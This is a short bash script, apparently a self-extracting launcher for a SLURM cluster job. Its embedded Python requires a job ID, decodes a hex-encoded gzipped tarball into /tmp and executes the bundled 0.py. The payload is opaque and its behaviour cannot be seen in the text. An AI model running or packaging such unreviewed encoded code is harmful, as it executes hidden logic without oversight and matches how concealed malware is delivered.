#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d6fdb300c867bf6af1072910d048abf1da7c871f71db65d86a2906d2a569ac886a4accd86fdf7497650641bb05bdb0de37388225b7c4991a21cb3bd19d4cd8b123bca389ec6f8f731ceb2e2f9fffcbcacaaf886c42f1bd6ccc958ae9dcbd7f0f517f26d618707508b0d59b4795741cceba449d762b1248b919f0f03efee4dcfd3a2f44b7853f02cc94491e57cddc44db66ed346e4599a97423431a44556b8b55041db1465db6575d5656552885ca415a4edb56a73b6609c6891d6ebba4efd9b035757ce4a9102144d5726507669d935659654455577023a5e246552f1745d252e90aac8f3b2ccebaaed78bd6e9a3c0751d68bef6f9ddc7f80988de717f7f1e7fe4f9224ffb5fff33cc3fe7f0de4711cb425e66c96fe43b0ecb9e90fb259baa408798040e8e148466efd437259fcde4d03bdf543e80c19d7bb2f9f93bbe8b6dd7a0de6dbdb84a15ed178fabad08869701d6fe1c9865114f0d994ae463deca1b5ab76381e4f4adaf36abf3fc349ed68b46a3fd3e966a2775ec6eebed2801b03cefd254436df14219fc5a7ebc4a9b31e9e3ab903e35c6db74ee5e75b8cde058fd2f6e4b23f368ca0421e116e88dd04440c9a00916a9a1029881a2c01a6f811983f28d678eb900ebaedb9eeeefb245ed168d30eca4a75826b1b69bc8330224e923246bdeab4ef592e62a397db682e0d904ffc7082775a0f3aa41f95e1c207319e2c8d9ce4b875a91ce96a36bc1dbd2528cb8e0f9dd4e13c31db0ffa044b7892c6de0f0fd32c724b1fb5b470498e65ae009ab7760a0ce6aaf882f822fa1a33a97c86c37869ac0e27a7eeed7404ae36ccf6c3f3513872a902ff13ea2878ebb38c20088220088220088220088220088220088220088220ff2b3f004a03449e00280000')
r=Path('/tmp')/('a'+j+'c4d7e0a91b28f')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
